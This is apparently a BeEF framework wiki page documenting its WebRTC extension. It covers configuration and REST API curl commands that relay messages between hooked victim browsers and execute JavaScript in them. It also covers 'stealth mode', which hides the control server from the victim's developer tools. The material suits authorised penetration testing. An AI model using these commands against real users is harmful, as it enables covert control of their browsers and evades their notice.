## Introduction


WebRTC stands for Web Realtime Communications and allows for peer-to-peer communications between two web browsers. The code for the WebRTC Extension can be found [here.](https://github.com/beefproject/beef/tree/master/extensions/webrtc)

By default, BeEF uses XMLHttpRequest objects to poll to your BeEF server every 5 seconds. The logic is in the `updater.js` file of the core BeEF JavaScript client. It executes a `setTimeout()` function call that executes `beef.updater.get_commands()`, requesting the `hook.js` file from the BeEF server.

BeEF has options to use the WebSocket protocol as well, which shifts the comms from a polling mechanism to a more bi-directional streaming method of sending and receiving data between the server and browsers. 

The problem with both the hook polling and WebSocket communication is exposure of the BeEF server. Not only does the IP address of the BeEF server gets exposed over the network, the communications are visible in the "Network" tabs of browser developer tools. This increases the risk of the experienced user realizing that their browser is hooked.

[[Images/beef-hooks.png|align=center]]

## Configuration

to enable it, simply change enable to `true`

```bash
beef:
    extension:
        webrtc:
            name: 'WebRTC'
            enable: false
            authors: ["xntrik"]
            stunservers: '["stun:stun.l.google.com:19302","stun:stun1.l.google.com:19302","turn:numb.viagenie.ca:3478"]'
            # stunservers: '["stun:stun.l.google.com:19302"]'
            turnservers: '{"username": "someone%40somewhere.com", "password": "somepass", "uris": ["turn:numb.viagenie.ca:3478?transport=udp","turn:numb.viagenie.ca:3478?transport=tcp"]}'

```

## Utilization 
WebRTC can be used to retrieve the internal (behind NAT) IP address of the victim machine, using the peer-to-peer connection framework. This command can be found under the Host module folder.

### console usage

When this extension is written, the console module is still usable and supported. Unfortunately, it is no longer usable.

see https://blog.beefproject.com/2015/01/hooked-browser-meshed-networks-with_26.html for console usage examples

## Rest API usage

### Get WebRTC status of a hooked browser

`GET /api/webrtc/status/:id`

**Request**

for getting the status of id 1:
```
curl http://localhost:3000/api/webrtc/status/1?token=498641adfe687860b55fb90eb6a4b9789fd5c4ca
```

**Response**
`{"success":true}`

that means WebRTC is available for that session.

### initiating WebRTC between two hooked browsers


`POST /api/webrtc/go`

**Request**
This initiates WebRTC communication between browsers 1 and 2.

```
curl -d '{"from":1,"to":2}' \
     http://localhost:3000/api/webrtc/go?token=498641adfe687860b55fb90eb6a4b9789fd5c4ca
```

**Response**

`{"success":true}`


### Sending messages

**Request**
This sends a message between browsers 1 and 2.

```
curl -d '{"from":1, "to":2, "message":"Just a plain message"}' \
     http://localhost:3000/api/webrtc/msg?token=498641adfe687860b55fb90eb6a4b9789fd5c4ca
```

**Response**

`{"success":true}`


#### Sending javascript to execute

The built in message handler for executing javascript is `%<code>`, sent just like a normal message.

This sends a message from browser 1 to 2 to execute a piece of JavaScript:

**Request**
```
curl -d '{"from":1, "to":2, "message":"%alert(\"hello\");"}' \
    -H "Content-type: application/json; charset=UTF-8" \
	 http://localhost:3000/api/webrtc/msg?token=498641adfe687860b55fb90eb6a4b9789fd5c4ca
```

### stealth mode

Stealth mode is also sent as a message between two browsers. The `to` browser will be put into stealth mode, tunnelling its communication with the BeEF server through the `from` browser.

### going into stealth mode

**Request**

This puts browser 2 into stealth mode (it stops communicating with the BeEF server)
```
curl -d '{"from":1, "to":2, "message":"!gostealth"}' \
    -H "Content-type: application/json; charset=UTF-8" \
	 http://localhost:3000/api/webrtc/msg?token=498641adfe687860b55fb90eb6a4b9789fd5c4ca
```

### getting out of stealth mode

**Request**

```
curl -d '{"from":1, "to":2, "message":"!endstealth"}' \
    -H "Content-type: application/json; charset=UTF-8" \
	 http://localhost:3000/api/webrtc/msg?token=498641adfe687860b55fb90eb6a4b9789fd5c4ca
```

### Executing modules through WebRTC

**Request**

Tell browser 2 (without communicating with the BeEF server) to execute command 102 through browser 1

the name is name of the option, and value is the corresponding option value.

```
curl -d '{"from":1, "to":2, "cmdid":102, "options":[{"name":"Domain","value":"default_all"}]}' \
    -H "Content-type: application/json; charset=UTF-8" \
	 http://127.0.0.1:3000/api/webrtc/cmdexec?token=498641adfe687860b55fb90eb6a4b9789fd5c4ca
```

The result will be displayed in the BeEF terminal output, and stored in the command events of the `from` browser.


### Getting event data from a browser

`GET /api/webrtc/cmdevents/:id`

**Request**

Get all events on browser 1

```
curl http://127.0.0.1:3000/api/webrtc/cmdevents/1?token=498641adfe687860b55fb90eb6a4b9789fd5c4ca
```

**Response**

```
{"events_count":1,"events":[{"id":1,"hb_id":1,"target_id":2,"status":"fingerprint=223c40dcd69ee362dcf478a80d34bbe8&components=[{\"key\":\"userAgent\",\"value\":\"Mozill...(snipped)
```

> the results of command execution are stored in the `from` browser. In this case, all command results from browser 2 are accessible through requesting events on browser 1.

For further information about the extension, read example RestAPI usage in 

`<beef_root>/extensions/webrtc/rest/webrtc.rb`


***
[[Module Creation|Module-creation]] | [[Development Organization|Development-Organization]]